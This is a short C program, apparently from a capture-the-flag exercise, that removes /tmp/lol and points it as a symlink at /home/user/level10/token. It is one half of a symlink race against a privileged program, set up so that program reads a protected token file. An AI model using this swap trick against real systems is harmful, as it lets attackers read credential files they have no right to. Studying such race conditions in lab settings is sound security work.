#include <stdio.h>
#include <unistd.h>

char	*slink = "/tmp/lol";
char	*file = "/home/user/level10/token";

int main(void)
{
	remove(slink);
	symlink(file, slink);
	return (0);
}
